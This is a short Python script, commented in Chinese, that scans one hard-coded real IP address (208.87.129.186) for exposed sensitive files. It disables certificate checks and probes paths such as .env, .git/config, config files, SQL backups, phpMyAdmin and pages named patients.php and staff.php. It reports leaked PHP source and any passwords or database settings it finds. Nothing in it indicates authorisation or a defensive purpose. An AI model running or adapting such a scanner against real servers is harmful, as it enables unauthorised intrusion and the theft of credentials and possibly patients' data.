#!/usr/bin/env python3
"""src_scan.py - 深挖源站208.87.129.186的Web文件泄露"""
import urllib.request, ssl, socket
from concurrent.futures import ThreadPoolExecutor, as_completed

socket.setdefaulttimeout(8)
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://208.87.129.186'

# 常见敏感文件/目录
PATHS = [
    '/', '/index.php', '/config.php', '/db.php', '/database.php', '/.env',
    '/.git/config', '/phpinfo.php', '/admin.php', '/login.php', '/upload.php',
    '/chat.php', '/send.php', '/api.php', '/api/', '/staff.php', '/patients.php',
    '/calls.php', '/dashboard.php', '/logout.php', '/settings.php',
    '/includes/', '/inc/', '/lib/', '/vendor/', '/composer.json',
    '/backup.zip', '/backup.sql', '/db.sql', '/database.sql',
    '/wp-config.php', '/wp-admin/', '/phpmyadmin/', '/.htaccess',
    '/robots.txt', '/sitemap.xml', '/info.php', '/test.php', '/1.php',
]

def fetch(path):
    url = BASE + path
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=8, context=ctx)
        b = r.read(3000)
        return path, r.status, len(b), b
    except urllib.error.HTTPError as e:
        return path, e.code, 0, b''
    except Exception:
        return path, 0, 0, b''

with ThreadPoolExecutor(max_workers=15) as ex:
    futs = {ex.submit(fetch, p): p for p in PATHS}
    for fu in as_completed(futs):
        path, status, size, body = fu.result()
        if status == 200 and size > 0:
            # 判断是否源码泄露(<?php开头)或敏感内容
            head = body[:200].decode('utf-8','ignore')
            if head.lstrip().startswith('<?php'):
                print('[源码泄露] %s (%d字节)' % (path, size))
            elif any(k in head.lower() for k in ['password', 'secret', 'config', 'db_', 'mysql']):
                print('[敏感] %s (%d字节): %s' % (path, size, head[:80].replace(chr(10),' ')))
            else:
                print('[200] %s (%d字节): %s' % (path, size, head[:60].replace(chr(10),' ')))
        elif status in (403, 401):
            print('[%d] %s' % (status, path))
